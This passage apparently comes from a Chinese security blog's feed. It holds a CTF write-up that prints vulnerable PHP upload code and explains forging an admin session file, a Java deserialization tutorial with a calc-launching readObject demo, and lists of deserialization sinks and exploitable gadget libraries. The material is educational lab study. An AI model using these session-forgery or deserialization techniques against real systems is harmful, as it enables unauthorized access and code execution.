class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">"/var/babyctf/"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"/flag"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//需要把SESSION中的username置为admin才能得到flag</span></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] =<span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//POST赋值</span></span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">'direction'</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//上传目录拼接一层attr</span></span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="comment">//上传路径拼接上session中的username</span></span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//上传文件</span></span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">"upload"</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//is_uploaded_file() 函数检查指定的文件是否是通过 HTTP POST 上传</span></span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid upload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//dir_path拼接上文件名</span></span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        <span class="comment">//文件名继续拼接上一段hash值</span></span><br><span class="line">        $file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        <span class="comment">//对上传路径进行正则匹配过滤../和..\\</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//dir_path创建目录，将临时文件移动到该目录下</span></span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">"uploaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//下载文件</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">"download"</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//返回路径中的文件名部分</span></span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">        <span class="comment">//file_path拼接上文件名</span></span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br><span class="line">        <span class="comment">//对下载路径进行正则匹配过滤../和..\\</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'file not exist'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//设置返回头，这个substr($filename, 0, -65)挺奇怪的，如果filename的长度小于65会返回false，返回的filename=""</span></span><br><span class="line">        header(<span class="string">'Content-Type: application/force-download'</span>);</span><br><span class="line">        header(<span class="string">'Content-Length: '</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">'"'</span>);</span><br><span class="line">        <span class="comment">//读取文件</span></span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">"downloaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看完源码后思路</p><p>一、上传session格式的文件，修改Cookie中的<code>PHPSESSID</code>从而伪造身份，文件内容，默认的session处理器得到的内容为<code>username|s:5:&quot;admin&quot;;</code>。主要利用的是相同的文件内容对应的文件名相同。</p><p>二、成功伪造admin后，还需要创建一个<code>/var/babyctf/success.txt</code>，可以通过POST传<code>attr</code>为<code>success.txt</code>创建目录绕过<code>file_exist()</code></p><p>然后有个小坑，读取下session文件，发现格式不太一样。。强行用一下download功能。。</p><p>需要最前面加个<code>%08</code>字符，以及没有<code>|</code>，其实就是将session处理器设置为 <code>php_binary</code></p><p><img src="https://i.loli.net/2020/04/20/FidDfgzbpv4xeZY.png" alt="Snipaste_2020-04-20_13-05-43.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
    
    </summary>
    
    
    
      <category term="wp" scheme="https://glotozz.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>jenkins-2.101-XStream rce分析</title>
    <link href="https://glotozz.github.io/2020/04/18/jenkins-2-101-XStream-rce%E5%88%86%E6%9E%90/"/>
    <id>https://glotozz.github.io/2020/04/18/jenkins-2-101-XStream-rce%E5%88%86%E6%9E%90/</id>
    <published>2020-04-18T11:30:02.000Z</published>
    <updated>2020-04-24T07:34:06.250Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="4d0cc4725e9d0ba5bafdc40bc8f476ee9068cf67352c80d1966d1cf5fbdc334c"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted.
    
    </summary>
    
    
    
      <category term="java" scheme="https://glotozz.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化原理</title>
    <link href="https://glotozz.github.io/2020/04/18/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    <id>https://glotozz.github.io/2020/04/18/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/</id>
    <published>2020-04-18T01:40:04.000Z</published>
    <updated>2020-04-20T02:58:57.124Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#为什么要序列化数据">为什么要序列化数据</a></li><li><a href="#序列化过程">序列化过程</a></li><li><a href="#反序列化过程">反序列化过程</a></li><li><a href="#反序列化漏洞修复">反序列化漏洞修复</a></li><li><a href="#反序列化漏洞触发场景">反序列化漏洞触发场景</a></li><li><a href="#反序列化漏洞挖掘">反序列化漏洞挖掘</a></li><li><a href="#参考链接">参考链接</a></li></ul><!-- tocstop --><hr><p>java体系很大，自己刚入门，分析一些历史漏洞的时候发现很多知识点联系不到一起，因此参考一些文章和自己的理解写一篇简单的总结。</p><h4><span id="为什么要序列化数据">为什么要序列化数据</span></h4><p><code>JSON和XML</code>是通用数据交互格式，通常用于不同语言、不同环境下数据的交互，比如前端的<code>JavaScript</code>通过<code>JSON</code>和后端服务通信、微信服务器通过<code>XML</code>和公众号服务器通信。但是这两种语言无法直接传输对象，比如，<code>Jackson和Fastjson</code>这类序列化库，在<code>JSON（XML）</code>的基础上进行改造，通过特定的语法来传递对象；亦或者如<code>RMI</code>，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行传输。</p><h4><span id="序列化过程">序列化过程</span></h4><p><code>Test1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test1</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">5754104541168322017L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test1</span><span class="params">(<span class="keyword">int</span> id,String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id=id;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    private void writeObject(java.io.ObjectOutputStream s) throws IOException &#123;</span></span><br><span class="line"><span class="comment">//        s.defaultWriteObject();</span></span><br><span class="line"><span class="comment">//        s.writeObject("This is a object");</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException &#123;</span></span><br><span class="line"><span class="comment">//        in.defaultReadObject();</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec("calc");</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Test1 test1 = <span class="keyword">new</span> Test1(<span class="number">1</span>,<span class="string">"gqy"</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"test1.ser"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(test1);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"test1.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>16进制查看</code></p><p><img src="https://i.loli.net/2020/04/18/gsvLxmN2lWdkGhV.png" alt="Snipaste_2020-04-18_10-46-41.png"></p><p><a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">SerializationDumper</a>查看序列化数据</p><p><img src="https://i.loli.net/2020/04/18/6eO1RpuWStrM9lb.png" alt="Snipaste_2020-04-18_10-56-15.png"></p><p>可以看到<code>ClassName</code>、<code>Fields</code>、<code>classdata</code>还是很清楚的，另外的一些可以看<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener">官方文档</a></p><p>Java在序列化时一个对象，将会调用这个对象中的 <code>writeObject()</code> 方法，参数类型是<br><code>ObjectOutputStream</code> ，开发者可以将任何内容写入这个<code>stream</code>中。</p><p>如果上面<code>Test1.java</code>重写<code>writeObject()</code>（参考<code>Test1.java</code>中的注释），序列化的数据是这样的，发现多了<code>objectAnnotation</code></p><p><img src="https://i.loli.net/2020/04/18/Tp4RgBrkCSKxNAm.png" alt="Snipaste_2020-04-18_11-27-55.png"></p><h4><span id="反序列化过程">反序列化过程</span></h4><p>反序列化时，会调用<code>readObject()</code> ，开发者也可以从中读取出前面写入的内容，并进行处理。</p><p>在命令执行处打个断点</p><p><img src="https://i.loli.net/2020/04/18/n6hfd5pPQa3rKmj.png" alt="Snipaste_2020-04-18_12-57-10.png"></p><p>根据调用栈可以清楚的下断点（一开始用的<code>java1.8</code>环境，建议换用<code>java1.7</code>，代码可读性更高）</p><p>跟进<code>readObject0()</code></p><p><img src="https://i.loli.net/2020/04/18/SlDwC8gLjz7NGOJ.png" alt="Snipaste_2020-04-18_14-20-32.png"></p><p><img src="https://i.loli.net/2020/04/18/AwPjNynZrcXsO6z.png" alt="Snipaste_2020-04-18_14-21-34.png"></p><p>这里读取的<code>tc</code>其实就是序列化数据中的<code>TC_OBJECT</code></p><p><img src="https://i.loli.net/2020/04/18/ye7bUzVBqJhwGHC.png" alt="Snipaste_2020-04-18_13-58-39.png"></p><p>跟进<code>readOrdinaryObject()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readOrdinaryObject</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 读取序列化中的ObjectStreamClass</span></span><br><span class="line">        ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>);</span><br><span class="line">        ...</span><br><span class="line"><span class="comment">// 通过反射，创建对象</span></span><br><span class="line">        Object obj;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            obj = desc.isInstantiable() ? desc.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 判断是否实现了Externalizable接口，如果实现了接口，使用这个接口来给属性赋值</span></span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable()) &#123;</span><br><span class="line">            readExternalData((Externalizable) obj, desc);</span><br><span class="line">        &#125; </span><br><span class="line"><span class="comment">// 我们并没有实现Externalizable接口，会进入到else判断</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 读取序列化的数据</span></span><br><span class="line">            readSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否自定义了readObject方法，如果有会调用，如果没有直接返回obj</span></span><br><span class="line"><span class="comment">// 此处省略</span></span><br><span class="line">       ...</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上面方法是反序列化的全部流程，重点看一下读取<code>ObjectStreamClass的readClassDesc()</code>方法和读取序列化数据的<code>readSerialData()</code>方法。</p><p>跟进<code>readClassDesc()</code></p><p><img src="https://i.loli.net/2020/04/18/crjQLKuM46Syad2.png" alt="Snipaste_2020-04-18_14-51-17.png"></p><p>这里对应的是<code>TC_CLASSDESC</code>中的内容</p><p><img src="https://i.loli.net/2020/04/18/gGFl2LR41rOoNQp.png" alt="Snipaste_2020-04-18_14-47-00.png"></p><p>注意到<code>case</code>还有个 <code>TC_PROXYCLASSDESC</code>是 <code>代理类描述符</code>，与反序列化漏洞修复相关，之后介绍。</p><p>先跟进<code>readNonProxyDesc()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectStreamClass <span class="title">readNonProxyDesc</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      ...</span><br><span class="line">       <span class="comment">// 创建ObjectStreamClass</span></span><br><span class="line">       ObjectStreamClass desc = <span class="keyword">new</span> ObjectStreamClass();</span><br><span class="line">    <span class="comment">// 读取ObjectStreamClass</span></span><br><span class="line">    ObjectStreamClass readDesc = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           readDesc = readClassDescriptor();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">           <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">               <span class="string">"failed to read class descriptor"</span>).initCause(ex);</span><br><span class="line">       &#125;</span><br><span class="line">    ...</span><br><span class="line">       <span class="comment">// 通过调用resolveClass()获取类名，跟进是通过Class.forName(name, false, latestUserDefinedLoader())反射获取类名</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">               resolveEx = <span class="keyword">new</span> ClassNotFoundException(<span class="string">"null class"</span>);</span><br><span class="line">...</span><br><span class="line">      <span class="comment">//  通过读取到ObjectStreamClass初始化desc</span></span><br><span class="line">       desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="keyword">false</span>));</span><br><span class="line">       ...</span><br><span class="line">       <span class="comment">// 返回desc</span></span><br><span class="line">       <span class="keyword">return</span> desc;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>readClassDescriptor()</code>=&gt;<code>readNonProxy()</code>，初始化属性</p><p>跟进<code>initNonProxy()</code>，主要是一些判断，比如<code>serialVersionUID</code>是否相等，否则抛出异常</p><p>前面已经初始化了属性，跟进<code>readSerialData()</code>，会读取并将属性赋值</p><h4><span id="反序列化漏洞修复">反序列化漏洞修复</span></h4><p>前面提到<code>TC_PROXYCLASSDESC</code>是 <code>代理类描述符</code>，与反序列化漏洞修复相关。其实说法不准确，应该说是针对 <code>resolveProxyClass</code> 和 <code>resolveClass()</code>方法，因为知道是通过上面两个方法获取类名，因此可以通过重写这两个方法设置黑名单抛出异常。</p><p>比如</p><p><img src="https://i.loli.net/2020/04/18/vhAoMzXEFZ1LDl7.png" alt="Snipaste_2020-04-18_17-38-31.png"></p><h4><span id="反序列化漏洞触发场景">反序列化漏洞触发场景</span></h4><p>在java编写的web应用与web服务器间java通常会发送大量的序列化对象例如以下场景：</p><ul><li><code>HTTP</code>请求中的参数，<code>cookies</code>以及<code>Parameters</code>。</li><li><code>RMI协议</code>，被广泛使用的<code>RMI协议</code>完全基于序列化</li><li><code>JMX</code>同样用于处理序列化对象</li><li>自定义协议 用来接收与发送原始的java对象</li></ul><p>个人觉得比较常见的是1、2</p><h4><span id="反序列化漏洞挖掘">反序列化漏洞挖掘</span></h4><ul><li><p>反序列化触发点</p><p>一、常见反序列化操作方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure></li><li><p><code>gadget chain</code></p><p>一、 实现 <code>Serializable</code> 或 <code>Externalizable</code>， 主要看 <code>readObject()</code> 和 <code>readExternal()</code></p><p>二、<code>XStream</code>、<code>JSON相关的序列化工具</code>等，不用实现上面提到的两个接口也可以实现类的序列化与反序列化。</p></li></ul><p><strong>常见可利用的第三方库</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">commons-logging 1.2</span><br><span class="line">commons-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 2.3.9</span><br></pre></td></tr></table></figure><hr><h4><span id="参考链接">参考链接</span></h4><p> <a href="https://govuln.com/" target="_blank" rel="noopener">https://govuln.com/</a> </p><p> <a href="http://www.lmxspace.com/" target="_blank" rel="noopener">http://www.lmxspace.com/</a> </p><p> <a href="https://www.cnblogs.com/studyskill/p/9207117.html" target="_blank" rel="noopener">https://www.cnblogs.com/studyskill/p/9207117.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
    
    </summary>
    
    
    
      <category term="java" scheme="https://glotozz.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java Sec Code学习笔记</title>
    <link href="https://glotozz.github.io/2020/04/15/Java-Sec-Code%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://glotozz.github.io/2020/04/15/Java-Sec-Code%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-15T13:11:31.000Z</published>
    <updated>2020-04-17T10:39:31.177Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#环境搭建">环境搭建</a></li><li><a href="#预备知识">预备知识</a></li><li><a href="#sqli">SQLI</a></li><li><a href="#xss">XSS</a></li><li><a href="#文件上传漏洞">文件上传漏洞</a></li><li><a href="#ssti">SSTI</a></li><li><a href="#jsonp劫持">JSONP劫持</a></li><li><a href="#commandinject">CommandInject</a></li><li><a href="#反序列化漏洞">反序列化漏洞</a></li><li><a href="#fastjson漏洞">FastJson漏洞</a></li><li><a href="#路径穿越漏洞">路径穿越漏洞</a></li><li><a href="#getrequesturi">GetRequestURI</a></li><li><a href="#ip伪造">IP伪造</a></li><li><a href="#spel">SpEL</a></li><li><a href="#xstreamrce">XStreamRce</a></li><li><a href="#url重定向">URL重定向</a></li><li><a href="#ssrf">SSRF</a></li><li><a href="#xxe">XXE</a></li><li><a href="#总结">总结</a></li></ul><!-- tocstop --><hr><p>之前主要是分析一些java中影响较大的历史漏洞，大多都是框架层面的漏洞，前两天看到JoyChou师傅github上的项目，是一个java漏洞代码的靶场，包括常见漏洞代码和安全代码，值得细品。</p><h4><span id="环境搭建">环境搭建</span></h4><p><a href="https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md</a> </p><p>该项目是基于spring框架开发，我搭建的方式选择idea搭建。</p><h4><span id="预备知识">预备知识</span></h4><p>在正式开始学习这个项目之前可以先简单学习下spring框架。</p><p><img src="https://i.loli.net/2020/04/16/7NvFOJjtVXBrMue.png" alt="Snipaste_2020-04-16_17-09-04.png"></p><p>虽然没用过spring框架，但是大致能看懂，先分析几个常规的文件。</p><p><code>Login.java</code></p><p><img src="https://i.loli.net/2020/04/16/31mqcAr869SHiQe.png" alt="Snipaste_2020-04-16_19-03-02.png"><code>Index.java</code></p><p><img 